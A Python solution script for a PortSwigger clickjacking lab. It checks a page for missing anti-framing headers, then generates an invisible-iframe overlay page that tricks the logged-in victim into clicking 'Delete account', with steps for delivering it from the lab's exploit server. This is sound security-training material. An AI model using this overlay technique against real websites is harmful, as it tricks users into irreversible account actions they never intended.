"""
Lab 1: Basic clickjacking with CSRF token protection
https://portswigger.net/web-security/clickjacking/lab-csrf-token-protected
Difficulty: Apprentice

📝 The flaw: no anti-framing header/CSP at all. The account-delete button
has a CSRF token, but that's irrelevant — it's the victim's real browser
making the real click through our invisible iframe, token included.

Goal: trick the logged-in victim (wiener) into deleting their account via
the "Delete account" button on /my-account.
"""

from utils import get_session, log, note, check_framing_defenses, build_basic_overlay_poc

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
VULNERABLE_PAGE = f"{TARGET}/my-account"


def run():
    s = get_session()
    note("Confirming the target has no X-Frame-Options/CSP before bothering")
    note("to build the overlay — if either were set this approach wouldn't work.")
    check_framing_defenses(s, VULNERABLE_PAGE)

    # Coordinates must match where "Delete account" actually renders — open
    # the lab's "Open in browser" alignment tool to get exact pixel offsets.
    html = build_basic_overlay_poc(VULNERABLE_PAGE, button_top="550px", button_left="60px")

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")

    note("Host this on the exploit server, use 'View exploit' to align the")
    note("decoy div over the real Delete account button, then Deliver to victim.")


if __name__ == "__main__":
    run()
